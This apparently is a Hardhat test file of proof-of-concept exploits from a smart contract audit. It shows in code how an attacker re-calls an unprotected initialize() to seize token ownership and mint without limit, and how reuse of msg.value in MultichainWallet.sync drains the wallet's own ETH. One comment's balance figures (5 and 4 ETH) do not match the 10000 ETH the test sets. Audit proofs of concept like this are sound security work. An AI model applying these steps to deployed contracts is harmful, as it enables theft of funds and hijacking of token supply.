import { expect } from "chai";
import { Contract } from "ethers";
import { ethers, owner, signer1, signer3 } from "../../../test/TestBase.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Proof-of-concept tests for the SCV audit on branch `ai-audit` @ 0064dfb.
//
//   Finding 1 (NEW, Critical) — Shares / SharesUnderAgreement / BridgedSharesUnderAgreement
//               expose `initialize(...) public initializer` but never call
//               `_disableInitializers()` (or consume the initializer in the constructor).
//               Anyone can call `initialize` after deployment and become owner; on the
//               bridged token this grants unlimited minting and breaks the supply peg.
//   Finding 2 (NEW, High) — MultichainWallet.sync(uint64[] targets, ...) loops over the
//               inner payable `sync`, which reads the SAME `msg.value` on every iteration
//               (MultichainWallet.sol:79). A caller who pays the fee for one chain makes the
//               wallet's own ETH balance pay for every further chain.

const DETERRENCE_FEE = ethers.parseEther("0.01");
const RECOVERY_DELAY = 184n * 24n * 60n * 60n; // 184 days in seconds

async function deployShares(): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const shares = await Shares.deploy(
    "POC",
    "PoC Shares",
    "https://poc.example/terms",
    owner
  );
  await shares.waitForDeployment();
  return shares as unknown as Contract;
}

// ---------------------------------------------------------------------------
// Finding 1 — Unprotected `initialize` on the token family (initializer never consumed)
// ---------------------------------------------------------------------------
describe("Finding 1 — unprotected initialize(): anyone can seize token ownership post-deploy", function () {
  it("Shares: attacker calls initialize() and becomes owner, then mints unlimited", async function () {
    const shares = await deployShares();
    expect(await shares.owner()).to.equal(await owner.getAddress());

    const attacker = signer3;
    // Constructor never consumed the initializer (no _disableInitializers), so the
    // `initializer` guard is still unset and ANYONE may re-initialize the live contract.
    await shares
      .connect(attacker)
      .initialize(
        "EVIL",
        "Evil Shares",
        "https://evil",
        await attacker.getAddress()
      );

    expect(await shares.owner()).to.equal(await attacker.getAddress());
    expect(await shares.symbol()).to.equal("EVIL");

    // The seized owner role can mint an arbitrary, unbounded supply.
    await shares.connect(attacker).mint(await attacker.getAddress(), 1000n);
    expect(await shares.totalSupply()).to.equal(1000n);
    expect(await shares.balanceOf(await attacker.getAddress())).to.equal(1000n);
  });

  it("SharesUnderAgreement: attacker calls initialize() and dethrones the issuer", async function () {
    const base = await deployShares();
    const SharesUnderAgreement = await ethers.getContractFactory(
      "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
    );
    const sha = await SharesUnderAgreement.deploy(
      await base.getAddress(),
      "https://poc.example/agreement",
      0,
      owner
    );
    await sha.waitForDeployment();
    expect(await sha.owner()).to.equal(await owner.getAddress());

    const attacker = signer3;
    await sha
      .connect(attacker)
      .initialize(
        await base.getAddress(),
        "https://evil",
        0,
        await attacker.getAddress()
      );

    expect(await sha.owner()).to.equal(await attacker.getAddress());
    // The attacker now controls the allowlist, pause, terms and freeze machinery of the wrapper.
  });

  it("BridgedSharesUnderAgreement: attacker mints unlimited bridged tokens, breaking the peg", async function () {
    const Bridged = await ethers.getContractFactory(
      "contracts/multichain/BridgedSharesUnderAgreement.sol:BridgedSharesUnderAgreement"
    );
    const bridged = await Bridged.deploy(
      "BSHA",
      "Bridged SHA",
      "https://poc.example/terms",
      owner
    );
    await bridged.waitForDeployment();
    expect(await bridged.owner()).to.equal(await owner.getAddress());

    const attacker = signer3;
    // 1) Take over ownership via the unprotected initializer.
    await bridged
      .connect(attacker)
      .initialize(
        "EVIL",
        "Evil Bridged",
        "https://evil",
        await attacker.getAddress()
      );
    expect(await bridged.owner()).to.equal(await attacker.getAddress());

    // 2) Owner can set the mint/burn authority (setPool), so the attacker names themselves.
    await bridged.connect(attacker).setPool(await attacker.getAddress());
    expect(await bridged.pool()).to.equal(await attacker.getAddress());

    // 3) onlyPool checks msg.sender == pool, which the attacker now trivially satisfies.
    //    The remote supply is supposed to equal the amount locked on the home chain, but the
    //    attacker can inflate it arbitrarily and burn real locked value for it.
    await bridged.connect(attacker).mint(await attacker.getAddress(), 1000n);
    expect(await bridged.totalSupply()).to.equal(1000n);
    expect(await bridged.balanceOf(await attacker.getAddress())).to.equal(
      1000n
    );
  });
});

// ---------------------------------------------------------------------------
// Finding 2 — MultichainWallet.sync reuses msg.value inside the loop
// ---------------------------------------------------------------------------
describe("Finding 2 — MultichainWallet.sync: msg.value reuse spends the wallet's own ETH", function () {
  const FEE = ethers.parseEther("1");
  const CHAIN_A = 1n; // arbitrary destination chain selectors
  const CHAIN_B = 2n;

  async function deployWallet(
    fee: bigint
  ): Promise<{ router: Contract; wallet: Contract }> {
    const MockCCIPRouter = await ethers.getContractFactory(
      "contracts/mocks/audit/agents/MockCCIPRouter.sol:MockCCIPRouter"
    );
    const router = await MockCCIPRouter.deploy();
    await router.waitForDeployment();
    await router.setFee(fee);

    const ArgSource = await ethers.getContractFactory(
      "contracts/multisig/MultichainWalletArgumentSource.sol:MultichainWalletArgumentSource"
    );
    const argSource = await ArgSource.deploy();
    await argSource.waitForDeployment();
    await argSource.initialize(await router.getAddress());

    const Master = await ethers.getContractFactory(
      "contracts/multisig/MultiSigWalletMaster.sol:MultiSigWalletMaster"
    );
    const wallet = await Master.deploy(await argSource.getAddress());
    await wallet.waitForDeployment();
    await wallet.initialize(await owner.getAddress()); // owner becomes the signer

    // Fund the fee-paying caller (signer3) explicitly: the network state is shared
    // across test files, so signer3's balance cannot be assumed here.
    await setBalance(await signer3.getAddress(), ethers.parseEther("100"));

    return { router, wallet };
  }

  it("control: single-chain sync charges exactly one fee and leaves the wallet balance intact", async function () {
    const { router, wallet } = await deployWallet(FEE);
    const walletAddr = await wallet.getAddress();
    await setBalance(walletAddr, ethers.parseEther("10000"));

    const before = await ethers.provider.getBalance(walletAddr);
    await wallet
      .connect(signer3)
      ["sync(uint64,address)"](CHAIN_A, await signer1.getAddress(), {
        value: FEE,
      });
    const after = await ethers.provider.getBalance(walletAddr);

    expect(await router.totalFeesCollected()).to.equal(FEE);
    // The sender's own ETH paid the fee; the wallet's pre-existing balance is untouched.
    expect(after).to.equal(before);
  });

  it("EXPLOIT: two-chain sync paid for one chain — the wallet's own balance funds the second", async function () {
    const { router, wallet } = await deployWallet(FEE);
    const walletAddr = await wallet.getAddress();
    await setBalance(walletAddr, ethers.parseEther("10000"));
    const before = await ethers.provider.getBalance(walletAddr);

    // The caller pays the fee for ONE chain (FEE), but asks for TWO chains. Inside the loop
    // `sync(uint64[] targets, ...)` re-invokes the payable `sync(chain, signerList, feeToken_)`,
    // which re-reads the same stale msg.value: the `msg.value < fee` guard (MultichainWallet.sol:79)
    // passes on iteration 2 as well, and the second fee is pulled from the wallet's own balance.
    await wallet
      .connect(signer3)
      ["sync(uint64[],address[],address)"](
        [CHAIN_A, CHAIN_B],
        [await signer1.getAddress()],
        ethers.ZeroAddress,
        { value: FEE }
      );

    expect(await router.totalFeesCollected()).to.equal(2n * FEE);
    expect(await router.sentChains(0)).to.equal(CHAIN_A);
    expect(await router.sentChains(1)).to.equal(CHAIN_B);

    // The wallet lost FEE of its OWN funds: it started with 5 ETH, ended with 4 ETH,
    // even though the caller only ever sent 1 ETH.
    const after = await ethers.provider.getBalance(walletAddr);
    expect(before - after).to.equal(FEE);
  });

  it("EXPLOIT: with more chains than the wallet balance, the whole sync reverts (griefing)", async function () {
    const { wallet } = await deployWallet(FEE);
    const walletAddr = await wallet.getAddress();
    await setBalance(walletAddr, ethers.parseEther("0.5")); // less than 2 x FEE

    await expect(
      wallet
        .connect(signer3)
        ["sync(uint64[],address[],address)"](
          [CHAIN_A, CHAIN_B],
          [await signer1.getAddress()],
          ethers.ZeroAddress,
          {
            value: FEE,
          }
        )
    ).to.be.revert(ethers); // second ccipSend fails: wallet balance already spent
  });
});
